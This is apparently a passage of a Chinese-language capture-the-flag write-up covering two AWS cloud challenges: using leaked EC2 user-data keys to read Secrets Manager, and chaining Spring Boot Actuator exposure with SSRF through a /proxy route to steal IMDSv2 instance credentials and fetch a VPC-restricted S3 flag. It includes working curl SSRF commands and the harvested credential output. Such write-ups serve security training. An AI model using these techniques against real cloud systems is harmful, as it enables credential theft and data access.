Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash

# Set AWS access keys
AWS_ACCESS_KEY_ID=AKIA3G7*****LVQ4
AWS_SECRET_ACCESS_KEY=Wpavn74pi**********n438v+w3/A+

aws --profile bob configure set aws_secret_access_key $AWS_ACCESS_KEY_ID
aws --profile bob configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY

yum update -y
yum install -y httpd

systemctl start httpd

systemctl enable httpd
mkdir /var/www/html/hg_launch_website

cd /var/www/html/hg_launch_website
aws s3 cp s3://huge-logistics-website-data/ ./
--//--
louise@ip-10-1-20-57:~$
```

在这里泄露了`bob`的AKSK

配置好AKSK之后到这里就已经获取到了`bob`的权限了

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws sts get-caller-identity --profile bob
{
    "UserId": "AIDA3G7WQODFNX5QXKTQ5",
    "Account": "770926735562",
    "Arn": "arn:aws:iam::770926735562:user/bob"
}
```

```
yliken@LAPTOP-40PQI58C:~/.aws$ aws iam get-policy-version --policy-arn arn:aws:iam::770926735562:policy/engineering --version-id v1 --profile newlouise
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:DescribeInstances"
                    ],
                    "Condition": {
                        "StringEquals": {
                            "aws:RequestedRegion": "us-west-2"
                        }
                    },
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "s3:ListBucket",
                        "s3:GetObject"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9/*",
                        "arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9"
                    ]
                },
                {
                    "Action": [
                        "iam:ListAttachedUserPolicies",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-09-22T12:49:46+00:00"
    }
}
```

查看名为'engineering'的IAM策略的具体权限内容 engineering角色具有`iam:ListAttachedUserPolicies, iam:ListAttachedRolePolicies, iam:GetPolicy, iam:GetPolicyVersion`权限

```
yliken@LAPTOP-40PQI58C:~/.aws$ aws iam get-policy-version --policy-arn arn:aws:iam::770926735562:policy/engineering --version-id v1 --profile newlouise
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:DescribeInstances"
                    ],
                    "Condition": {
                        "StringEquals": {
                            "aws:RequestedRegion": "us-west-2"
                        }
                    },
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "s3:ListBucket",
                        "s3:GetObject"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9/*",
                        "arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9"
                    ]
                },
                {
                    "Action": [
                        "iam:ListAttachedUserPolicies",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-09-22T12:49:46+00:00"
    }
}
```

然后使用engineering角色的权限(即前文的newlouise用户)来列出 bob 所附加的 IAM 策略。

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile newlouise iam list-attached-user-policies --user-name bob
{
    "AttachedPolicies": [
        {
            "PolicyName": "ReadSecretsManager",
            "PolicyArn": "arn:aws:iam::770926735562:policy/ReadSecretsManager"
        }
    ]
}
```

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile newlouise iam get-policy-version --policy-arn arn:aws:iam::770926735562:policy/ReadSecretsManager --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "secretsmanager:ListSecrets",
                        "secretsmanager:GetSecretValue"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "AllowReadSecretsManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-09-22T12:49:44+00:00"
    }
}
```

然后使用bob的身份列出secret

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile bob secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-west-2:770926735562:secret:flag_1cd5667c10d8-UFJuzO",
            "Name": "flag_1cd5667c10d8",
            "Description": "Congratulations! You found the flag!",
            "LastChangedDate": "2025-09-22T20:49:45.064000+08:00",
            "LastAccessedDate": "2025-09-22T08:00:00+08:00",
            "SecretVersionsToStages": {
                "terraform-20250922124944990700000005": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-09-22T20:49:44.697000+08:00"
        }
    ]
}
```

使用bob的权限查看sercet

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile bob secretsmanager get-secret-value --secret-id flag_1cd5667c10d8
{
    "ARN": "arn:aws:secretsmanager:us-west-2:770926735562:secret:flag_1cd5667c10d8-UFJuzO",
    "Name": "flag_1cd5667c10d8",
    "VersionId": "terraform-20250922124944990700000005",
    "SecretString": "a0055b44f3f9e27665fbfccadfd17a9c",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-09-22T20:49:45.060000+08:00"
}
```

### 总结

​![Abuse OpenID Connect and GitLab for AWS Access .png](images/img_18991_021.png)

## WIZ云安全锦标赛-Perimeter Leak

[Perimeter Leak](https://www.cloudsecuritychampionship.com/)

### Spring Boot Actuator端点

最开始在env里面找到了一条消息, 有一个spring boot站点

![](images/20250924165300-dff528b4-9923-1.png)

目录扫描一下,`/actuator` 系列是 **Spring Boot Actuator** 的端点

![](images/20250924165301-e0297b26-9923-1.png)

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env|jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5059    0  5059    0     0    388      0 --:--:--  0:00:13 --:--:--  1163
{
  "activeProfiles": [],
  "defaultProfiles": [
    "default"
  ],
  "propertySources": [
    {
      "name": "server.ports",
      "properties": {
        "local.server.port": {
          "value": 8080
        }
      }
    },
    {
      "name": "servletContextInitParams",
      "properties": {}
    },
    {
      "name": "systemProperties",
      "properties": {
        "java.specification.version": {
          "value": "24"
        },
        "sun.jnu.encoding": {
          "value": "UTF-8"
        },
        "java.class.path": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "java.vm.vendor": {
          "value": "Amazon.com Inc."
        },
        "sun.arch.data.model": {
          "value": "64"
        },
        "java.vendor.url": {
          "value": "https://aws.amazon.com/corretto/"
        },
        "catalina.useNaming": {
          "value": "false"
        },
        "user.timezone": {
          "value": "UTC"
        },
        "java.vm.specification.version": {
          "value": "24"
        },
        "os.name": {
          "value": "Linux"
        },
        "APPLICATION_NAME": {
          "value": "spring"
        },
        "sun.java.launcher": {
          "value": "SUN_STANDARD"
        },
        "sun.boot.library.path": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64/lib"
        },
        "sun.java.command": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "jdk.debug": {
          "value": "release"
        },
        "sun.cpu.endian": {
          "value": "little"
        },
        "user.home": {
          "value": "/home/ec2-user"
        },
        "user.language": {
          "value": "en"
        },
        "java.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.version.date": {
          "value": "2025-04-15"
        },
        "java.home": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64"
        },
        "file.separator": {
          "value": "/"
        },
        "java.vm.compressedOopsMode": {
          "value": "32-bit"
        },
        "line.separator": {
          "value": "
"
        },
        "java.vm.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.specification.name": {
          "value": "Java Platform API Specification"
        },
        "FILE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "java.awt.headless": {
          "value": "true"
        },
        "java.protocol.handler.pkgs": {
          "value": "org.springframework.boot.loader.net.protocol"
        },
        "sun.management.compiler": {
          "value": "HotSpot 64-Bit Tiered Compilers"
        },
        "java.runtime.version": {
          "value": "24.0.1+9-FR"
        },
        "user.name": {
          "value": "ec2-user"
        },
        "stdout.encoding": {
          "value": "UTF-8"
        },
        "path.separator": {
          "value": ":"
        },
        "os.version": {
          "value": "6.1.134-152.225.amzn2023.x86_64"
        },
        "java.runtime.name": {
          "value": "OpenJDK Runtime Environment"
        },
        "file.encoding": {
          "value": "UTF-8"
        },
        "java.vm.name": {
          "value": "OpenJDK 64-Bit Server VM"
        },
        "java.vendor.version": {
          "value": "Corretto-24.0.1.9.1"
        },
        "java.vendor.url.bug": {
          "value": "https://github.com/corretto/corretto-24/issues/"
        },
        "java.io.tmpdir": {
          "value": "/tmp"
        },
        "catalina.home": {
          "value": "/tmp/tomcat.8080.7538161798062223442"
        },
        "java.version": {
          "value": "24.0.1"
        },
        "user.dir": {
          "value": "/home/ec2-user/spring-boot"
        },
        "os.arch": {
          "value": "amd64"
        },
        "java.vm.specification.name": {
          "value": "Java Virtual Machine Specification"
        },
        "PID": {
          "value": "515405"
        },
        "CONSOLE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "catalina.base": {
          "value": "/tmp/tomcat.8080.7538161798062223442"
        },
        "native.encoding": {
          "value": "UTF-8"
        },
        "java.library.path": {
          "value": "/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib"
        },
        "java.vm.info": {
          "value": "mixed mode, sharing"
        },
        "stderr.encoding": {
          "value": "UTF-8"
        },
        "java.vendor": {
          "value": "Amazon.com Inc."
        },
        "java.vm.version": {
          "value": "24.0.1+9-FR"
        },
        "sun.io.unicode.encoding": {
          "value": "UnicodeLittle"
        },
        "java.class.version": {
          "value": "68.0"
        },
        "LOGGED_APPLICATION_NAME": {
          "value": "[spring] "
        }
      }
    },
    {
      "name": "systemEnvironment",
      "properties": {
        "INVOCATION_ID": {
          "value": "cb49fb685ed2497eb60672956106753c",
          "origin": "System Environment Property "INVOCATION_ID""
        },
        "HOME": {
          "value": "/home/ec2-user",
          "origin": "System Environment Property "HOME""
        },
        "PATH": {
          "value": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin",
          "origin": "System Environment Property "PATH""
        },
        "SHELL": {
          "value": "/bin/bash",
          "origin": "System Environment Property "SHELL""
        },
        "BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property "BUCKET""
        },
        "LOGNAME": {
          "value": "ec2-user",
          "origin": "System Environment Property "LOGNAME""
        },
        "USER": {
          "value": "ec2-user",
          "origin": "System Environment Property "USER""
        },
        "SYSTEMD_EXEC_PID": {
          "value": "515405",
          "origin": "System Environment Property "SYSTEMD_EXEC_PID""
        },
        "LANG": {
          "value": "C.UTF-8",
          "origin": "System Environment Property "LANG""
        },
        "JOURNAL_STREAM": {
          "value": "8:1745835",
          "origin": "System Environment Property "JOURNAL_STREAM""
        }
      }
    },
    {
      "name": "Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'",
      "properties": {
        "spring.application.name": {
          "value": "spring",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25"
        },
        "management.endpoints.web.exposure.include": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43"
        },
        "management.endpoints.web.expose": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33"
        },
        "management.endpoint.env.show-values": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37"
        },
        "server.error.include-message": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30"
        }
      }
    },
    {
      "name": "applicationInfo",
      "properties": {
        "spring.application.version": {
          "value": "0.0.1-SNAPSHOT"
        },
        "spring.application.pid": {
          "value": 515405
        }
      }
    }
  ]
}
```

在`/actuator/env`中找到了一个桶

![](images/20250924165301-e051f7e2-9923-1.png)

尝试匿名访问这个桶，没权限访问

![](images/20250924165301-e073d4c8-9923-1.png)

在这个网站的默认页面，有提示`Welcome to the proxy server`

![](images/20250924165301-e097f31c-9923-1.png)

### SSRF

在`/actuator/mappings`里面有`/proxy`路由的信息

![](images/20250924165302-e0bd2254-9923-1.png)

可以尝试在`/proxy`页面使用ssrf访问aws元数据

![](images/20250924165302-e0dcbb6e-9923-1.png)

### **获取EC2实例角色临时凭证**

页面401启用了`IMDSv2`

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion$ TOKEN=$(curl -X PUT "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && \
curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0      4      0  0:00:14  0:00:13  0:00:01    11
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

访问iam中心获取一组AKSK

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion$ TOKEN=$(curl -X PUT "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0     36      0  0:00:01  0:00:01 --:--:--    36
{
  "Code" : "Success",
  "LastUpdated" : "2025-09-23T12:45:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAR***XLN7XBL3X",
  "SecretAccessKey" : "zpZgR7X************/W9R6r6EhQ0lpudr/N",
  "Token" : "IQoJb3JpZ2luX2VjEL3//////////wEaCXVzLWVhc3QtMSJGMEQCICnlb/ixxn6hNBMkwGEwfIGKsUQkvXSzoqdmxw9D0pbOAiA6bReMkKSzDl6HbzkC8pHDGpx9bzrigFHjluQlbmxmfiq4BQhGEAAaDDA5MjI5Nzg1MTM3NCIMT/gVkQMw6R+dcqi/KpUF93F1OS+95nRgsoe6TZsXC63IX4T9JQNO94qfZly0w38cPoUmGGmlY3vHyJ8AjcJl6zZKbHR89wweZyRcgu0Jc8suU716ritwsHrtzCUuz9Jj0T00WCooqwH09kv6Ou9e6XjXyL7QRlsZPAoEFAsZy9927gzAuHHXEkBN4Nwz9aCqz/hkbeuUSZDBi4wNWWxF05Bv+RMVNR4Hf2wYai6JupaNvd54dcdopeiQjEjkr3E0F/RbK0CffxQSth59AqH5fFhaXLJU7E+K/0wRPnE6c6P/FVEu/P9kBz9YsCgTsm5/DKfgdD/XOAzgtXMJ451tDXxVDv3Qhf6MOD3QkZVF/kVeUo01v3XQGR8hrtlCSeOZAI4QfKiPxjYzVYq2cAd3+DpLOfdpIUWcyrfXhNJI6qTZf48MvhAjKr5vd5U2RzsJAGPAMzLJxNjnda992YXVwDPeuLK+0vHW2y8ifdLl1wU0hDAAIpspFtHrZJm+YIY0sn3zBT6uxL/MZbZgLojDANMA+IZdU+j0Wz1KlzXPwDIdbKBZ7PgQX0HBsjKzUR65QlQpjJgOaE4mV7ajS1AQFC9rE9yUXMen7oOIEJFOMa/qm+PKvvyu9yrOXXR6YO4FR7zNSGWIdHaldsVrOsB30bUTUH7CznnDiGmv7/GaOrkWVwG+7pj3mUYVRn+Np5zbCmkEVKDQfW9W/0wKMlGzQGSIYI96d0n0hmzbOJg3IcyYd7EU3qJs41WhdR9SPwES1kYnc5cM9f3XSlt5Wxyg4kzmG8IOlZnPj5YMdVVwEK6Y2omTtgnnlga/kNLRT5bh+HQCrWcUFhYDL/H/LlKjMSX62XCBVkmJGx/xHW/OGLnCxmozuTmLy8+CrzaCHCQHQ6lJlDDFrMrGBjqyASQf9dsMEd+IiVOCrGagNz8JUAAd3S2DOkS83I+n+4D4BBCMou245YuhOHDpgsMmGHNlazq/9ThrKklyIuoUK+n50ZPSajto3Zu3sgfQp95VPvSJBjK/fjVf+WaH6rRV1POxVevqyxI4Z2QqUX+X2s0WhnyVTN29zKm4lGDP7urf/pCdx4YUPhjdoSY3V2fu/kfxKV6K0RcKQ6i882RDVNdXWx7M8umTbhsiU4LVuE6nBTE=",
  "Expiration" : "2025-09-23T19:11:53Z"
}
```

访问刚才获取的那个桶，可得到地区信息

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion$ curl -I https://challenge01-470f711.s3.amazonaws.com/
HTTP/1.1 200 Connection established

HTTP/1.1 403 Forbidden
x-amz-bucket-region: us-east-1
x-amz-request-id: QXHRDMDFPFGNTK05
x-amz-id-2: GlfK4F5TdOpO2C5bFq+KI+ZAk5qYb+6uFphbBH9nhdKa6aewVQBQOgvU/hGIa4uhhB5DLFAs+Tc=
Content-Type: application/xml
Transfer-Encoding: chunked
Date: Tue, 23 Sep 2025 13:07:48 GMT
Server: AmazonS3
```

### 尝试直接访问S3失败

将其在AWSCLI中配置好访问刚才那个桶，有flag 但是没办法读取内容

![](images/20250924165302-e1014c4a-9923-1.png)

hello.txt里面仅有一句话

![](images/20250924165302-e12d763a-9923-1.png)

使用`aws-enumator`枚举一下

![](images/20250924165303-e15bdf02-9923-1.png)

![](images/20250924165303-e18871fa-9923-1.png)

没什么用。

列出存储桶策略

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/092297851374$ aws s3api get-bucket-policy --bucket challenge01-470f711 --profile wizone --query "Policy" --output text | jq .
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::challenge01-470f711/private/*",
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpce": "vpce-0dfd8b6aa1642a057"
        }
      }
    }
  ]
}
```

这个策略的内容是: 桶 `challenge01-470f711` 下 `private/` 文件夹的对象，除非请求来自 VPC 终端节点 `vpce-0dfd8b6aa1642a057`，否则所有人都不能读取。

### 获取flag

也就是我们需要通过VPC去读取flag

那么现在是目标就是 通过proxy服务器

访问读取存储桶中的flag

> **S3预签名**
>
> AWS S3 的 **预签名 URL（Pre-signed URL）** 是一种临时授权机制，它允许用户在 **不拥有 AWS 访问权限的情况下**访问特定的 S3 对象（文件）。简单来说，它是一种带有时间限制的“临时密钥”，可以安全地分享 S3 文件。

生成预签名URL

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/092297851374$ aws s3 presign s3://challenge01-470f711/private/flag.txt --profile wizone
https://challenge01-470f711.s3.us-east-1.amazonaws.com/private/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIARK7LBOHXCEU7EI44%2F20250923%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250923T143116Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEL7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQDCK87og6hD08%2B4SurGUvjYtifniKBN9dBRjLEkatHSVgIgGFZSFmqONKphKq2aDww%2BiVz9trEZsaXrGpztJqL5d7MquAUIRxAAGgwwOTIyOTc4NTEzNzQiDGIOQ6JdIUQh2%2B457iqVBWgf44AZ2i6CGN4owREiKXQ6leYQkhF9f78X5VHSbv0eI3rLeLWMxfgAhlaw9MP3WQLCdNz7wnfaUN84cV1SVd9M0zwX%2BJ5d9veMmqMmV%2B2C%2FQWPcAUqLxtt%2FCfoU%2FU8Z6hGoYbhyFFvKSrzWpmNPJCHLBA36C8jlRBvxXLNEuwxGLBCOSCUNFeAaDmJtqJp%2BEDUB5WZaXls3ZX%2FXMGRUdIWQ%2Bx17jiP3SqYJLdJWT%2FLVprLcCpcfDwbYrFAccbo4zGPqnrxm%2FfhSftVnAfUc8olVcEwmxhjN%2F%2Fn5mUve7OrN4Vu3JuccNCyWRSK2m5aIITnokkLZdF6Hc8MkI9dn6ZkW%2F0XnKrYBblN8Z4IjggEVMKl0W0%2BfbIGNwALBfXtikNWKVkAFUvSEcFwxta5ULntecHQzX75m4GLBvzz2Mnywi42WdOFsPZyz%2FP%2BCTUu7oKnPCeJj55RaWhcqnWJctu3TlRqcTJdKkg%2BGT0LsQo8Sr3K0BvzhCI4o3ZxSiMkmsAghn1tvO%2Fm3e6yPbQkbQH%2Bu9kPXnPNNW9uSoIPIhVzDpxI%2BdWuL82zWzGkxQuSsf30ZLmgk174%2BEGMCsNTeA49FlUqBtMkPbiB9uCixli3PK97WHKeaSR3a%2Bc3SZPdwNTwOMzYE3mWFOOxmHGpVC7VMhB4HaWec7BkdYgRPfijqv%2BgW6b%2FOAViTc6kXFktDcqW3TMJFDeJgeC753vtVrWgzRLoxwVcqQCJdTqWYjKG8AgTFV1eSXS5iwwFF6mhdTYAqt8h4ZnURlaKMAesIaVZoawmciTptt25owd1lzOic0u5vSaSAMMJ9Jutjx3w6mhm2vd1ydb6N2xmBoijbKJK5bDRKmOhCmRZAGykfZYDmTZh%2FK4ww8nKxgY6sQFxjYWjh66qXqdCNAOZGbEiOFuiLyfp4g3dhpMRdcp1AObWczEA07xz3bmr0u3SpCc1pM2sAmu2Nk%2FP74voiBnbreNLfDLwc9ryfF1OsVqUBKSS3CXN5ltroN%2FGUEFsj4fJDoTG08C%2Bv3HPgjCuW%2Fr5%2B9EAns8PsKWiRbnE5SNt1eoqKpMjEa%2FbSVTfMc6BtDwurWnaBQxI9YS%2BAd4b1tXcgOtH0Hb0QC7DSenYQQ6KRDI%3D&X-Amz-Signature=0300ffaedca318b96a1c25ab924b969dfe7b40a81d6daa27745e81ed9f68f230
```

在进行访问之前需要进行url编码

![](images/20250924165303-e1af5ea2-9923-1.png)

然后访问

![](images/20250924165304-e1d7af92-9923-1.png)

### 总结

![result.png](images/img_18991_035.png)
